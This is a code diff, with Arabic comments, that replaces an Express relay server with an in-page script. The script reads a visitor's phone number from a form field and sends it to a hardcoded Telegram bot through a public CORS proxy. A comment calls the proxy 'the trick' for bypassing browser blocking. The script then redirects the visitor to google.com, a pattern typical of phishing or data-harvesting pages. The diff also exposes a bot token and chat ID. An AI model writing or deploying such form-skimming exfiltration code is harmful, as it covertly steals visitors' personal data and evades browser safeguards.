@@ -1,26 +1,23 @@
-const express = require("express");
-const fetch = require("node-fetch");
-const cors = require("cors"); // أضفنا هذا للسماح لـ HTML بمراسلته
-
-const app = express();
-app.use(cors()); // تفعيل الـ CORS على السيرفر
-
-app.get("/send", async (req, res) => {
-    // بياناتك الخاصة
+<script>
+async function sendToTelegram() {
     const TOKEN = "8736983183:AAHZI864nf1nxjmOlqsAnwhSoK9K2VR5W7Y";
     const CHAT_ID = "5156556639";
+    const phone = document.getElementById('phone').value;
     
-    // استقبال النص من المتصفح (اختياري)
-    const message = req.query.msg || "تم الاتصال من السيرفر ✅";
-
-    try {
-        const r = await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`);
-        const data = await r.json();
-        res.json(data);
-    } catch (error) {
-        res.status(500).json({ error: "فشل الاتصال بتليجرام" });
-    }
-});
-
-const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log(`Server is running on port ${PORT}`));
+    // هنا الخدعة: نستخدم وسيط لتجاوز حظر المتصفح
+    const proxy = "https://api.allorigins.win/get?url=";
+    const telegramUrl = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent("رقم جديد: " + phone)}`;
+    
+    // إرسال البيانات عبر الوسيط
+    fetch(proxy + encodeURIComponent(telegramUrl))
+    .then(response => {
+        if (response.ok) {
+            alert("✅ تم الإرسال بنجاح وتجاوز الحظر!");
+            window.location.href = "https://www.google.com";
+        }
+    })
+    .catch(err => {
+        alert("❌ حتى الوسيط تم حظره، المتصفح متشدد جداً.");
+    });
+}
+</script>
